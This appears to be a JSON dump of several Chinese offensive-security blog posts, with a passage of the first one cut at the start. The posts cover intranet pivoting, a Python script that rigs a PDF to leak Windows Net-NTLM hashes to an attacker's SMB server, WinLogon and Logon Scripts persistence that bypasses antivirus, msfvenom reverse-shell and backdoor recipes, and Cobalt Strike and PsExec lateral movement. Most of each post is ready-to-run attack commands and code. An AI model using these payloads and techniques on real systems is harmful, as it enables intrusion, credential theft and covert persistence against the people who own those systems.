通过☁️目标边界服务器成功登录到目标内网服务器。 Metasploit上线通过☁️目标边界服务器把其目标内网服务器(不出网)通过payload上线到☁️VPS攻击机的metasploit上。 12345/sbin/iptables -P INPUT ACCEPTiptables -t nat -A PREROUTING -d 192.168.144.203 -p tcp -m tcp --dport 5353 -j DNAT --to-destination 192.168.144.211:53iptables -t nat -A POSTROUTING -d 192.168.144.211 -p tcp -m tcp --dport 53 -j SNAT --to-source 192.168.144.203iptables -A FORWARD -o eth0 -d 192.168.144.211 -p tcp --dport 53 -j ACCEPT/etc/init.d/iptables save &amp;&amp; /etc/init.d/iptables restart 通过msfvenom生成正向的payload。 1sudo msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;53 -f exe &gt; fw.exe 接着，在☁️VPS攻击机启用metasploit监听后，将该payload在目标内网服务器(不出网) 上执行。 123456sudo msfconsole -qmsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcpmsf5 exploit(multi/handler) &gt; set rhost 192.168.144.203 #边界服务器IPmsf5 exploit(multi/handler) &gt; set lport 5353 #边界服务器portmsf5 exploit(multi/handler) &gt; run -j 最后，目标内网服务器(不出网)成功上线到☁️VPS攻击机的metasploit上。 总结Linux的iptables有些类似windows的netsh，但iptables的功能更加强大。由于需要事先开启目标系统的路由转发功能，所以root权限是必不可少的，一切都需在提权之后进行。","categories":[{"name":"端口转发","slug":"端口转发","permalink":"https://payloads.cn/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"利用PDF文件获取Net-NTLM hash","slug":"利用PDF文件获取Net-NTLM-hash","date":"2020-02-03T08:54:50.000Z","updated":"2021-07-07T07:15:32.860Z","comments":true,"path":"2020/0203/.html","link":"","permalink":"https://payloads.cn/2020/0203/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言当用户使用PDF阅读器打开一份恶意的PDF文档，该PDF会向远程SMB服务器发出请求，如果该远程SMB服务器对数据包进行抓取，就能够获得用户Windows系统的Net NTLM Hash，通过使用Hashcat暴力破解还原就有可能获得用户系统的明文密码。 利用原理在 PDF 规范允许为 GoTobe 和 GoToR 条目来加载远程数据，正是利用这一特性能够帮我们请求远程恶意 smb 服务器，以此达到截获目标系统用户密码 hash 的目的。 利用思路 构造一份特殊的PDF文档，请求SMB服务器的一份文件 在SMB服务器上抓包 用户使用PDF阅读器打开PDF文档时，Windows系统将当前用户的Net NTLM Hash发送到SMB服务器 SMB服务器提取出Net NTLM Hash，使用Hashcat进行破解 还原出用户的明文密码 根据用户的明文密码尝试进一步利用 利用过程首先，利用 poc 脚本构造恶意的 pdf 文件。 1python WorsePDF.py /Users/anonysec/Desktop/demo.pdf 192.168.199.246 #此IP为msf的IP 之后，msf 打开 smb 监听，要用它来接收发过来的 ntlm 认证数据 (ntlm hash)。 1234sudo msfconsole -qmsf5 &gt; use auxiliary/server/capture/smbmsf5 auxiliary(server/capture/smb) &gt; set johnpwfile pdfmsf5 auxiliary(server/capture/smb) &gt; run 当恶意的PDF文件在目标系统被 Adobe Reader 打开后，即可看到 msf 的 smb 监听器成功获取到来自目标系统的Net NTLM Hash。 用 Wireshark 查看网络传输中的数据包，包含 Net NTLM Hash 。 最后，可利用Hashcat还原用户的明文密码，达到进一步深度利用的目的。 注意事项 目标用户必须使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行 相对于传统的钓鱼页面，此类手法更加的隐蔽 需自行克服免杀问题 附代码12345678910111213141516171819202122232425262728293031323334353637# WorsePDF# Turn a normal PDF file into malicious.Use to steal Net-NTLM Hashes from windows machines.import sysdef AddPayload(Data,ip): Payload = &#x27;/AA &lt;&lt;/O &lt;&lt;/F (\\\\\\\\\\\\\\\\&#x27; + ip + &#x27;\\\\\\\\test)/D [ 0 /Fit]/S /GoToE&gt;&gt;&gt;&gt;&#x27; index1 = Data.find(&#x27;/Parent&#x27;) + 13 # print &quot;%x&quot; % index1 Newdata = Data[0:index1] + Payload + Data[index1:] return Newdataif __name__ == &quot;__main__&quot;: print &quot;WorsePDF - Turn a normal PDF file into malicious.Use to steal Net-NTLM Hashes from windows machines.\\n&quot; if len(sys.argv)!=3: print (&#x27;Usage:&#x27;) print (&#x27; WorsePDF.py &lt;normal PDF file Path&gt; &lt;ServerIP&gt;&#x27;) sys.exit(0) print &quot;[*]NormalPDF: %s&quot; % sys.argv[1] print &quot;[*]ServerIP: %s&quot; % sys.argv[2] file_object = open(sys.argv[1],&#x27;rb&#x27;) try: all_the_text = file_object.read( ) finally: file_object.close() Newdata = AddPayload(all_the_text,sys.argv[2]) MaliciousPath = sys.argv[1] + &#x27;.malicious.pdf&#x27; print &quot;[+]MaliciousPDF: %s&quot; % MaliciousPath file_object2 = open(MaliciousPath, &#x27;wb&#x27;) file_object2.write(Newdata) file_object2.close() print &quot;[*]All Done&quot;","categories":[{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"Windows权限维持之WinLogon","slug":"Windows权限维持之WinLogon","date":"2020-01-14T11:42:25.000Z","updated":"2021-07-07T07:16:41.326Z","comments":true,"path":"2020/0114/.html","link":"","permalink":"https://payloads.cn/2020/0114/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 简介Windows Logon Process（即winlogon.exe)，是Windows用户登陆程序，它处理各种活动，例如登录、注销、在身份验证期间加载用户配置文件，关闭，锁定屏幕等。 这种行为由注册表管理，该注册表定义了在Windows登录期间启动哪些进程。 注册表项12HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserinitHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell 利用过程Userinit1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit 首先，利用msfvenom生成payload。 1sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.144.174 LPORT=5353 -f exe &gt; logon.exe 生成的payload需要放入C:\\Windows\\System32\\中，修改注册表项“ Userinit ”。这样，在Windows重新登录期间，可以同时运行这两个可执行文件：userinit.exe 与 logon.exe。 Metasploit启用监听，当目标操作系统注销、重启等，Session就会上线。 12345msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 0.0.0.0msf5 exploit(multi/handler) &gt; set lport 5353msf5 exploit(multi/handler) &gt; run -j Shell1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell 同样，利用msfvenom生成payload。 1sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.144.174 LPORT=5353 -f exe &gt; logon.exe 生成的payload放入C:\\Program Files\\Internet Explorer\\中，修改注册表项“ Shell ”。系统重新登录期间，同时运行这两个可执行文件：explorer.exe 与 logon.exe。 Metasploit启用监听，当目标操作系统注销、重启等，Session就会上线。 12345msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 0.0.0.0msf5 exploit(multi/handler) &gt; set lport 5353msf5 exploit(multi/handler) &gt; run -j 拓展可以直接在命令行中对注册表进行设置，修改Shell和Userinit注册表项。 12reg add &quot;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /v Shell /d &quot;explorer.exe,logon.exe&quot; /freg add &quot;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /v Userinit /d &quot;Userinit.exe,logon.exe&quot; /f","categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"SSH加密隧道之端口转发","slug":"SSH加密隧道之端口转发","date":"2020-01-09T05:35:28.000Z","updated":"2021-07-07T07:18:42.008Z","comments":true,"path":"2020/0109/.html","link":"","permalink":"https://payloads.cn/2020/0109/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 简介SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据，还能够将其他TCP端口的网络数据通过SSH连接进行转发，并且自动提供了相应的加密及解密服务，这一过程被叫做“SSH隧道” (tunneling)。 SSH隧道加密传输，两大优势： 加密SSH Client 端至SSH Server 端之间的通讯数据 突破防火墙的限制完成一些之前无法建立的TCP 连接 SSH隧道加密传输， C/S 模式的架构，配置文件分为： 服务器端配置文件：/etc/ssh/sshd_config 客户端配置文件：/etc/ssh/ssh_config、用户配置文件~/.ssh/config 参数详解关于建立ssh隧道时所用到一些参数的详细解释： 1234567891011-C 压缩传输，加快传输速度-f 在后台对用户名密码进行认证-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行-q 安静模式，不要显示任何debug信息-l 指定ssh登录名-g 允许远程主机连接到本地用于转发的端口-L 进行本地端口转发-R 进行远程端口转发-D 动态转发，即socks代理-T 禁止分配伪终端-p 指定远程ssh服务端口 本地转发把本地端口数据转发到远程服务器，本地服务器作为SSH客户端及应用户端，称为正向 tcp 端口加密转发。 基础环境本地攻击机 10.11.42.99 ☁️VPS 192.168.144.174 ☁️目标Widnwos Web服务器(出网) 192.168.144.210 必要配置到☁️VPS192.168.144.174机器上修改 ssh 配置： 12345678# vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yesPasswordAuthentication yes# service ssh restart 参数详解 AllowTcpForwarding 是否允许TCP转发，默认值为”yes”。 GatewayPorts 是否允许远程主机连接本地的转发端口，默认值是”no”。 GatewayPorts no 这可以防止连接到服务器计算机外部的转发端口。 GatewayPorts yes 这允许任何人连接到转发的端口。如果服务器在公共互联网上，互联网上的任何人都可以连接到端口。 GatewayPorts clientspecified 这意味着客户端可以指定一个IP地址，该IP地址允许连接到端口的连接。其命令是： ssh -R 1.1.1.1:8080:localhost:80 www.example.com 在这个例子中，只有来自IP地址为1.1.1.1且目标端口是8080的被允许。 TCPKeepAlive 指定系统是否向客户端发送 TCP keepalive 消息，默认值是”yes”。这种消息可以检测到死连接、连接不当关闭、客户端崩溃等异常。 可以理解成保持心跳，防止 ssh 断开。 具体流程先在本地攻击机执行ssh转发，之后用远程桌面连接本地的33389端口，实际是连接192.168.144.210的远程桌面。 简单说 就是通过☁️VPS这台机器把本地攻击机的33389端口转到了☁️目标服务器的3389端口上，也就是说这个ssh 隧道是建立在本地攻击机与☁️VPS之间的。 12ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Hostssh -C -f -N -g -L 33389:192.168.144.210:3389 root@192.168.144.174 -p 22 远程转发把远程端口数据转发到本地服务器，本地服务器作为SSH客户端及应用服务端，称为反向tcp端口加密转发。 基础环境☁️VPS 10.11.42.99 ☁️目标Linux Web服务器(出网) 192.168.144.174 目标Widnwos Web服务器(不出网) 192.168.144.210 必要配置现已获取☁️目标服务器(出网)权限，在该机器上修改 ssh 配置： 12345678# vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yesPasswordAuthentication yes# service ssh restart 具体流程继续在☁️目标服务器(出网)执行ssh转发，通过 ☁️VPS这台机器，把来自外部的33389端口流量都转到目标服务器(不出网)的 3389 上。 12ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Hostssh -C -f -N -g -R 33389:192.168.144.210:3389 anonysec@10.11.42.99 -p 22 回到 ☁️VPS这台机器，查看33389端口是否处于监听状态。如果处于监听状态，则说明ssh隧道建立成功。 注意：隧道建立成功后，默认并非监听在 0.0.0.0，而是监听在 127.0.0.1，可以用rinetd再做一次本地转发。 先在☁️VPS上装好rinetd，之后在rinetd配置文件中添加一条转发规则。 123456apt install rinetd -yvim /etc/rinetd.conf0.0.0.0 3389 127.0.0.1 33389 #转发规则service rinetd start rinetd本地转发后，查看端口是否处于监听状态。 1netstat -an |egrep &quot;3389|33389&quot; 远程连接☁️VPS的3389端口，成功连接进入目标服务器(不出网)的远程桌面中。 动态转发动态端口转发实际上是建立一个ssh正向加密的socks4/5代理通道，任何支持socks4/5协议的程序都可以使用这个加密的通道来进行代理访问，称为正向加密socks。 基础环境☁️VPS 10.11.42.99 ☁️目标Linux Web服务器(出网) 192.168.144.174 目标Widnwos Web服务器(不出网) 192.168.144.210 目标Widnwos Web2服务器(不出网) 192.168.144.155 必要配置现已获取☁️目标服务器(出网)权限，在该机器上修改 ssh 配置： 12345678# vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yesPasswordAuthentication yes# service ssh restart 具体流程在☁️VPS执行ssh转发，并查看10080端口是否处于监听状态。 123ssh -C -f -N -g -D listen_port user@Tunnel_Hostssh -C -f -N -g -D 10080 root@192.168.144.174 -p 22 #监听127.0.0.1ssh -C -f -N -g -D 0.0.0.0:10080 root@192.168.144.174 -p 22 #监听0.0.0.0 回到metasploit机器上，挂 socks 代理，扫描内网服务器MS17_010。 123456sudo msfconsole -qmsf5 &gt; setg proxies socks5:10.11.42.99:10080msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.210msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 10msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run 双重加密利用”ssh隧道+rc4双重加密”去连接目标内网下指定机器上的meterpreter，让payload变的更加难以追踪。 首先，用msfvenom生成bind的rc4 payload，并将rc4.exe传入到目标Web2服务器(不出网)中，并执行。 1msfvenom -p windows/meterpreter/bind_tcp_rc4 rc4password=AnonySec lport=443 -f exe -o rc4.exe 回到metasploit机器上，挂 socks 代理，直接bind连接到目标内网中Web2服务器(不出网)的meterpreter下。 12345678sudo msfconsole -qmsf5 &gt; setg proxies socks5:10.11.42.99:10080msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcp_rc4msf5 exploit(multi/handler) &gt; set rc4password AnonySecmsf5 exploit(multi/handler) &gt; set rhost 192.168.144.155msf5 exploit(multi/handler) &gt; set lport 443msf5 exploit(multi/handler) &gt; run -j 总结SSH隧道的实战利用，需要全方位考虑，本文只是讲述了SSH端口转发的思路，实际更需要去探索如何应对某些极端的目标内网环境！","categories":[{"name":"端口转发","slug":"端口转发","permalink":"https://payloads.cn/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"Metasploit的payloads模块详解","slug":"Metasploit的payloads模块详解","date":"2020-01-08T02:54:05.000Z","updated":"2021-07-07T07:16:51.573Z","comments":true,"path":"2020/0108/.html","link":"","permalink":"https://payloads.cn/2020/0108/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 简介Payloads模块，叫有效载荷或有效负载，也就是常说的shellcode，就是在漏洞利用成功后所要做的事情。在MSF中为我们提供了大量的实用payloads。 当执行 show payloads命令后，显示3列，分别为：payload名称、等级、描述。 命名规则平台/类型/规则名称 如 windows/meterpreter/reverse_tcp 类型类型主要有以下几种： shell : 得到一个shell Dllinject ：上传DLL并注入到进程 Patchup：补丁漏洞 Upexec : 上传并执行一个文件 Meterpreter：高级payload Vncinject：高级payload PassiveX：高级payload 规则名称 reverse_tcp : 反向建立tcp连接 bind_tcp ：反向建立tcp连接 shell_find_tag ： 在一个已建立的链接上创建一个shell shell_reverse_tcp : 反向连接到攻击者主机并创建一个shell reverse_http: 通过HTTP隧道通信兵创建一个新用户添加到管理组 add_user : 创建一个新用户并添加到管理组 xxx_ipv6_tcp ： 基于IPv6 xxx_nonx_tcp ：非No eXecute或 win 7（N是应用在CPU的一种可以防止缓冲区溢出的技术） xxx_ord_tcp : 有序payload xxx_tcp_allports ： 在所有可能的端口 等级等级代表好用程度，一般分为以下几个等级： normal：正常 excellent ：优秀 great：极好 good：好 average：平均，一般 manual：手动 描述描述是对payloads模块的简介 详细信息 info 模块名 使用先exploit模块，再payloads模块 当选择了一个exploit模块并设置完选项后，我们可以用show payloads来看一下当前exploit可以用哪些payloads？而不是随意选择。 选择和使用payloads下的某个模块，列出payloads下某个模块的具体设置选项（包括exploits使用参数后） set payload payload_name show options","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"如何使用msfvenom","slug":"如何使用msfvenom","date":"2020-01-07T02:51:54.000Z","updated":"2021-07-07T07:15:41.553Z","comments":true,"path":"2020/0107/.html","link":"","permalink":"https://payloads.cn/2020/0107/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 简介Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。 参数详解为了开始使用 msfvenom，可以首先浏览一下它所支持的命令参数： -l 查看所有payload。 -p 添加载荷payload。 载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门，所以只有选对payload，再填写正确自己的IP，PORT就可以生成对应语言，对应平台的后门了。 (- -payload-options 列出payload选项) -f 输出文件格式。 (- -help-formats 列出所有文件格式) 可执行格式： asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war 转换格式： bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript -e 编码免杀。 -a 选择架构平台 x86 | x64 | x86_64 Platforms: windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe。 -o 文件输出。 -n 为payload指定一个 nopsled 长度 。 -b 避免使用的字符 例如：不使用 ‘\\0f’。 -s 生成payload的最大长度，就是文件大小。 -i 编码次数。 -c 添加自己的shellcode。 -x | -k 捆绑。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。 如何生成 Payload为了生成 Payload，需要配置两个必要的参数（-p 与 -f）。 典型生成1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f exe &gt; shell.exe 编码处理型-i 参数来将一个 payload 编码多次，有时候多次编码可以绕过防病毒软件的检测（俗称免杀），但要知道的是：编码并不能真正作为免杀的解决方案。 -e选项来开启 payload 编码功能。 1msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; –f exe –o C:\\back.exe 捆绑12msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\\nomal.exe –k LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; –f exe –o C:\\shell.exe 输出串联如何将 msfvenom 的输出串联起来（利用操作系统管道的重定向特性）。 以前旧的 msfpayload 与 msfencode 经常串联使用，并按照多种编码顺序排列。msfvenom 也可以被这样使用： 123msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw -e x86/shikata_ga_nai -i 5 | \\msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \\msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe 系统Linux 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f elf &gt; shell.elf Windows 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f exe &gt; shell.exe Mac 1msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f macho &gt; shell.macho WebPHP 1msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.php ASP 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f asp &gt; shell.asp JSP 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.jsp WAR 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f war &gt; shell.war 脚本Python 1msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.py Bash 1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.sh Perl 1msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.pl Shellcode 有关所有shellcode，请参阅msfvenom -help-formats以获取有关有效参数的信息。 基于Linux的Shellcode 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f &lt;language&gt; 基于Windows的Shellcode 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f &lt;language&gt; 基于Mac的Shellcode 1msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f &lt;language&gt; 监听12345msf5 &gt; use exploit/multi/handlermsf5 &gt; set payload &lt;payload名称&gt;msf5 &gt; set lhost/rhost &lt;本地IP/目标IP&gt;msf5 &gt; set lport &lt;本地端口&gt;msf5 &gt; run -j -z Reference How to use msfvenom","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"Windows权限维持之LogonScripts","slug":"Windows权限维持之LogonScripts","date":"2020-01-06T09:19:19.000Z","updated":"2021-07-07T07:16:35.866Z","comments":true,"path":"2020/0106/.html","link":"","permalink":"https://payloads.cn/2020/0106/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 简介Logon Scripts是系统的登录脚本，这里说一个特别用法， Logon Scripts能够优先于安全软件执行，绕过安全软件对敏感操作的拦截，本文将具体介绍这个技巧。 Logon Scripts用法拦截测试cmd输入如下代码（安全软件拦截） 1wmic ENVIRONMENT create name=&quot;AnonySec&quot;,username=&quot;%username%&quot;,VariableValue=&quot;Logon Scripts!&quot; 设置Logon Scripts1.bat代码如下 1234wmic ENVIRONMENT create name=&quot;AnonySec&quot;,username=&quot;%username%&quot;,VariableValue=&quot;Logon Scripts!&quot;reg query HKEY_CURRENT_USER\\Environment /V AnonySecpause 启用Logon Scripts注册表路径：HKCU\\Environment 创建字符串键值： UserInitMprLogonScript 键值设置为bat的绝对路径：C:\\1.bat 绕过360对wmi调用的拦截由于调用WMI会被拦截，可以通过powershell实现添加注册表键值，启动Logon Scripts，代码如下： 1New-ItemProperty &quot;HKCU:Environment&quot; UserInitMprLogonScript -value &quot;C:\\1.bat&quot; -propertyType string | Out-Null 重新登录注销计算机重新登录。如果注册表HKCU\\Environment成功被写入键值AnonySec REG_SZ Logon Scripts!，说明Logon Scripts优先于安全软件执行，绕过安全软件的限制。 上线C2以MSF为例，可以直接生成payload，利用Logon Scripts反弹msf shell，进行权限的维持。 1234567sudo msfconsole -qmsf5 &gt; use exploit/multi/script/web_deliverymsf5 exploit(multi/script/web_delivery) &gt; set target 2msf5 exploit(multi/script/web_delivery) &gt; set payload windows/x64/meterpreter/reverse_httpmsf5 exploit(multi/script/web_delivery) &gt; set lhost 10.11.42.99msf5 exploit(multi/script/web_delivery) &gt; set lport 5353msf5 exploit(multi/script/web_delivery) &gt; run -j","categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"实战中内网穿透的打法","slug":"实战中内网穿透的打法","date":"2020-01-05T13:35:48.000Z","updated":"2021-08-06T02:37:10.697Z","comments":true,"path":"2020/0105/.html","link":"","permalink":"https://payloads.cn/2020/0105/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言在内网渗透时，一个WebShell或CobaltStrike、Metasploit上线等，只是开端，更多是要内网横向移动，扩大战果，打到核心区域。但后渗透的前提是需要搭建一条通向内网的“专属通道”，才能进一步攻击。可实战中因为网络环境不同，所利用的方式就不同。 以下为自我总结“实战中内网穿透的打法”思维导图： 目标出网（socks代理）这是实战中最愿意碰到的网络环境，目标机可以正常访问互联网，可直接在目标机挂socks代理或CobaltStrike上线，打通目标的内网通道。 Frp（socks5）Frp服务端配置文件： 12[common]bind_port = 8080 Frp客户端配置文件： 1234567891011121314[common]server_addr = xx.xx.xx.xxserver_port = 8080#服务端口使用Web常见端口[socks5]type = tcpremote_port = 8088plugin = socks5use_encryption = true use_compression = true#socks5口令#plugin_user = SuperMan#plugin_passwd = XpO2McWe6nj3 此处添加了加密压缩这两个功能，默认是不开启的，根据作者介绍，压缩算法使用的是 snappy。 use_encryption = true 启用加密 [通信内容加密传输，有效防止流量被拦截] use_compression = true 启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源] use_encryption = true 、use_compression = true 必须放在相关协议下面。 frp客户端与配置文件传到目标机后，把程序名与配置文件进行修改，并放在系统相关文件夹中，做到隐蔽。 加密压缩的对比这是frp客户端配置文件中未使用encryption 与compression功能，利用metasploit挂socks代理，扫描ms17_010传输的数据包，明显可辨别出具体攻击行为。如果目标内网有”态势感知“、流量分析等安全设备，就会被监测到，导致权限丢失。 使用encryption 与compression功能后，虽攻击源地址同样会暴露，但传输的数据包却无法辨别，规避了内网中的安全监测设备。 CobaltStrike (socks4a)到已控目标机的Beacon下将socks代理开启。 1beacon &gt; socks 1024 #端口根据VPS实际情况进行设置 菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中，或直接将socks4a挂在相关安全工具中。 上线不出网机器这是link链接，只要主链路(出网机Beacon)掉线，均掉！ SMB Beacon官方对SMB Beacon的介绍：SMB Beacon是使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽。 创建一个SMB的Listener (host与port可无视)，注意Listener选择，在session中选择route可达的主机派生会话。 运行成功后，可以看到 ∞∞ 这个字符，这就是派生SMB Beacon的连接状态。 可在主Beacon上用link host链接或unlink host断开。 12beacon&gt; link 192.168.144.155beacon&gt; unlink 192.168.144.155 Link Listener在已上线的主机创建Listener。 导出该类型Listener对应的可执行文件或dll等。 选择刚建立的Listener。 上传刚才生成的payload到当前已上线的目标机中，这里用PsExec.exe 工具 。(CobalStrike本身psexec功能不够强大) 在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 1beacon&gt; shell C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe 1beacon&gt; shell netstat -ano |findstr 4444 SSH Login12beacon&gt; ssh 192.168.144.174:22 root adminbeacon&gt; ssh 192.168.144.203:22 root admin 在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。 目标不出网（http代理）目标机网络中可能有防火墙、网闸等，只允许http单向出，无法正常访问互联网，用上述socks方法是行不通的，只能用http代理进行渗透。 reGeorg (socks5)1python reGeorgSocksProxy.py -u http://192.168.144.211/tunnel.aspx -l 0.0.0.0 -p 10080 利用metasploit挂reGeorg socks代理，扫描ms17_010传输的数据包，明显可辨别攻击行为。 Neo-reGeorg (加密)1python neoreg.py -k test@123 -l 0.0.0.0 -p 10081 -u http://192.168.144.211/neo-tunnel.aspx 使用Neo-reGeorg后，数据包已被加密传输。 冰蝎 (开socks5)冰蝎的数据包传输是加密的，本身也具备socks代理功能，但传输过程中存在丢包情况。这里同样是利用metasploit探测ms17_010漏洞，结果显示不存在。当不设置代理探测时，实际漏洞是存在的。 虽然冰蝎的这种代理扫描方式不如reGeorg准确，但小线程的端口探测等是可行的，如 auxiliary/scanner/portscan/tcp。准确度更多是因某种探测或其他方式的数据包在传输过程中的多少而决定。 reduh 